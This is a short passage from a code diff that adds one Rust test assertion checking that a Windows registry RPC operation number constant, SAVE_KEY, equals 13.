+        assert_eq!(winreg_opnum::SAVE_KEY, 13);
     }
 }
